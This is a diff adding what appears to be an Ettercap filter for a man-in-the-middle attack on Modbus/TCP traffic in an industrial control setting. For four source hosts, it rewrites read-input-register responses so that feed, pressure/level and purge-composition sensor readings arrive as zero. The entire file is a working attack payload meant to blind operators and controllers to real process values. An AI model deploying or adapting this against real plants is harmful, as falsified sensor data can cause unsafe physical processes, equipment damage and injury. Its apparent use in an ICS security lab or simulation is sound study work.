@@ -1,0 +1,37 @@
+# manipulate feed 1/feed 2 readings to 0
+# manipulate pressure/level readings to 0
+# manipulate a in purge to 0
+
+# feed 1
+if (ip.src == '192.168.95.10' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 11 = 0x00;
+        DATA.data + 12 = 0x00;
+    }
+}
+
+# feed 2
+if (ip.src == '192.168.95.11' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 11 = 0x00;
+        DATA.data + 12 = 0x00;
+    }
+}
+
+# pressure/level
+if (ip.src == '192.168.95.14' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 9 = 0x00;
+        DATA.data + 10 = 0x00;
+        DATA.data + 11 = 0x00;
+        DATA.data + 12 = 0x00;
+    }
+}
+
+# a in purge
+if (ip.src == '192.168.95.15' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 9 = 0x00;
+        DATA.data + 10 = 0x00;
+    }
+}
